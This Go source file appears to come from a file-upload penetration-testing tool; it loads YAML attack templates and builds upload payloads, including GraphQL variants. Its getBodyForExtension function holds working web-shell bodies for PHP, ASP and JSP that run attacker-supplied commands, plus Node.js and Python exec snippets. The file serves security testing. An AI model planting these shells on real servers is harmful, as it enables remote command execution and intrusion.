package template

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"gopkg.in/yaml.v3"

	"github.com/HaakimSec/GoUpload/internal/payload"
)

// Template represents a complete attack template
type Template struct {
	Name            string                 `yaml:"name"`
	Description     string                 `yaml:"description"`
	Author          string                 `yaml:"author"`
	Version         string                 `yaml:"version"`
	TechStack       string                 `yaml:"tech_stack"`
	Target          TargetConfig           `yaml:"target"`
	Headers         map[string]string      `yaml:"headers"`
	FormData        map[string]string      `yaml:"form_data"`
	Payloads        []TemplatePayload      `yaml:"payloads"`
	GraphQL         *GraphQLTemplateConfig `yaml:"graphql,omitempty"`
	SuccessInd      []string               `yaml:"success_indicators"`
	FailureInd      []string               `yaml:"failure_indicators"`
}

// TargetConfig defines the upload endpoint configuration
type TargetConfig struct {
	Endpoint string `yaml:"endpoint"`
	Method   string `yaml:"method"`
	Param    string `yaml:"param"`
}

// TemplatePayload defines a single payload in a template
type TemplatePayload struct {
	Name        string   `yaml:"name"`
	Filename    string   `yaml:"filename"`
	Extension   string   `yaml:"extension"`
	ContentType string   `yaml:"content_type"`
	Body        string   `yaml:"body"`
	Tags        []string `yaml:"tags"`
}

// GraphQLTemplateConfig defines GraphQL-specific template settings
type GraphQLTemplateConfig struct {
	Mutation           string `yaml:"mutation"`
	Variable           string `yaml:"variable"`
	OperationsTemplate string `yaml:"operations_template"`
	MapTemplate        string `yaml:"map_template"`
}

// LoadTemplate loads a single template from a YAML file
func LoadTemplate(path string) (*Template, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("failed to read template file: %w", err)
	}

	var tmpl Template
	if err := yaml.Unmarshal(data, &tmpl); err != nil {
		return nil, fmt.Errorf("invalid template YAML: %w", err)
	}

	// Validate required fields
	if tmpl.Name == "" {
		return nil, fmt.Errorf("template must have a name")
	}
	if len(tmpl.Payloads) == 0 && tmpl.GraphQL == nil {
		return nil, fmt.Errorf("template must have at least one payload or graphql config")
	}

	return &tmpl, nil
}

// LoadTemplates loads all templates from a directory
func LoadTemplates(dir string) ([]*Template, error) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return nil, fmt.Errorf("failed to read templates directory: %w", err)
	}

	var templates []*Template
	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}
		ext := strings.ToLower(filepath.Ext(entry.Name()))
		if ext == ".yaml" || ext == ".yml" {
			tmpl, err := LoadTemplate(filepath.Join(dir, entry.Name()))
			if err != nil {
				fmt.Fprintf(os.Stderr, "  Warning: skipping %s: %s\n", entry.Name(), err)
				continue
			}
			templates = append(templates, tmpl)
		}
	}

	return templates, nil
}

// LoadAllTemplates loads templates from multiple directories
func LoadAllTemplates(dirs []string) ([]*Template, error) {
	var allTemplates []*Template
	for _, dir := range dirs {
		templates, err := LoadTemplates(dir)
		if err != nil {
			fmt.Fprintf(os.Stderr, "  Warning: could not load templates from %s: %s\n", dir, err)
			continue
		}
		allTemplates = append(allTemplates, templates...)
	}
	return allTemplates, nil
}

// ToPayloads converts template payloads to GoUpload's internal Payload type
func (t *Template) ToPayloads() []*payload.Payload {
	var payloads []*payload.Payload

	// Convert standard payloads
	for _, tp := range t.Payloads {
		p := &payload.Payload{
			TestType:    "Template",
			Technique:   fmt.Sprintf("[%s] %s", t.Name, tp.Name),
			Filename:    tp.Filename,
			Extension:   tp.Extension,
			Body:        []byte(tp.Body),
			ContentType: tp.ContentType,
			Tags:        append([]string{"template", t.Name}, tp.Tags...),
		}
		payloads = append(payloads, p)
	}

	// Convert GraphQL payloads if present
	if t.GraphQL != nil {
		graphQLPayloads := createGraphQLPayloadsFromTemplate(t)
		payloads = append(payloads, graphQLPayloads...)
	}

	return payloads
}

// createGraphQLPayloadsFromTemplate creates GraphQL-specific payloads from template config
func createGraphQLPayloadsFromTemplate(t *Template) []*payload.Payload {
	var payloads []*payload.Payload

	// File types to test with the GraphQL mutation
	fileTypes := []struct {
		ext       string
		technique string
		tags      []string
	}{
		{".php", "PHP via GraphQL template", []string{"graphql", "php"}},
		{".php5", "PHP5 via GraphQL template", []string{"graphql", "php", "alt-ext"}},
		{".phtml", "PHTML via GraphQL template", []string{"graphql", "php"}},
		{".jsp", "JSP via GraphQL template", []string{"graphql", "java"}},
		{".js", "Node.js via GraphQL template", []string{"graphql", "nodejs"}},
		{".py", "Python via GraphQL template", []string{"graphql", "python"}},
	}

	for _, ft := range fileTypes {
		p := &payload.Payload{
			TestType:  "GraphQL",
			Technique: fmt.Sprintf("[%s] %s", t.Name, ft.technique),
			Filename:  "upload" + ft.ext,
			Extension: ft.ext,
			Body:      getBodyForExtension(ft.ext),
			Tags:      append([]string{"template", "graphql", t.Name}, ft.tags...),
			GraphQL: &payload.GraphQLFields{
				Operations: t.GraphQL.OperationsTemplate,
				Map:        t.GraphQL.MapTemplate,
				FileIndex:  "0",
			},
		}
		payloads = append(payloads, p)
	}

	return payloads
}

// getBodyForExtension returns appropriate payload body for an extension
func getBodyForExtension(ext string) []byte {
	switch strings.ToLower(ext) {
	case ".php", ".php5", ".phtml", ".phar":
		return []byte(`<?php system($_GET['cmd']); ?>`)
	case ".asp", ".aspx", ".ashx":
		return []byte(`<% eval request("cmd") %>`)
	case ".jsp", ".jspx":
		return []byte(`<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`)
	case ".js":
		return []byte(`require('child_process').exec('id', (e,o)=>{console.log(o)})`)
	case ".py":
		return []byte(`import os; os.system("id")`)
	default:
		return []byte(`<?php system($_GET['cmd']); ?>`)
	}
}

// ListAvailableTemplates prints all available templates
func ListAvailableTemplates(templatesDir string) {
	fmt.Println("\n  Available Templates:")
	fmt.Println("  ====================")

	entries, err := os.ReadDir(templatesDir)
	if err != nil {
		fmt.Printf("  No templates found in %s\n", templatesDir)
		return
	}

	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}
		fmt.Printf("\n  📁 %s/\n", entry.Name())

		subEntries, _ := os.ReadDir(filepath.Join(templatesDir, entry.Name()))
		for _, sub := range subEntries {
			if !sub.IsDir() && (strings.HasSuffix(sub.Name(), ".yaml") || strings.HasSuffix(sub.Name(), ".yml")) {
				tmpl, err := LoadTemplate(filepath.Join(templatesDir, entry.Name(), sub.Name()))
				if err == nil {
					fmt.Printf("     📄 %-30s - %s\n", sub.Name(), tmpl.Description)
				}
			}
		}
	}
	fmt.Println()
}
